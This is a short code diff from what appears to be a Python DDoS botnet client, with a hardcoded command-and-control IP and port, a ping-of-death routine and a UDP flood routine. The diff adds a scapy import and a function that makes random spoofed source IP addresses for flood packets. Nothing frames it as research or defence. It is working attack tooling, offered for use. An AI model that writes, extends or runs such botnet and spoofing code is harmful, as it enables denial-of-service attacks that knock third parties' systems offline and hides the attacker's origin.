@@ -9,6 +9,7 @@ import cloudscraper
 import requests
 import ctypes
 from icmplib import ping as pig
+from scapy.all import IP, UDP, Raw, send
 
 C2_ADDRESS = "147.185.221.27"
 C2_PORT = 4887
@@ -81,6 +82,16 @@ def pod(target, timer):
             send(packet)
         except:
             pass
+
+def spoofer():
+    addr = [192, 168, 0, 1]
+    d = '.'
+    addr[0] = str(random.randrange(11, 197))
+    addr[1] = str(random.randrange(0, 255))
+    addr[2] = str(random.randrange(0, 255))
+    addr[3] = str(random.randrange(2, 254))
+    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
+    return assemebled
 
 def attack_udp(ip, port, secs, size=65500):
     while time.time() < secs:
